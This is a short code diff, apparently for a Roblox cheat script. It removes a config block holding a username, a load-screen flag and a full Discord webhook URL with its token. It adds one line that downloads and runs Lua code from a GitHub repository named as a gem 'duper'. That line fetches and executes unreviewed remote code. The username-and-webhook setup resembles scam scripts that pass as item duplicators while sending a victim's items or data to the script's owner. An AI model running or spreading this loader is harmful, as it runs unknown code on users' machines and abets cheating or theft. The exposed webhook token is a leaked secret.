@@ -1,3 +1,1 @@
-Username = "Bloxxy_Luffy"
-LoadScreen = true 
-Webhook = "https://discord.com/api/webhooks/1287138904062820494/gEnhUPDc5_UZuJjyviLjgtdAKEcbbxUA1KOgqSqpm4l3YLZ_s1-JEWppXw8yfZXStnfW"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/bloxxy12/Gem-huge-dupper/refs/heads/main/duper", true))()
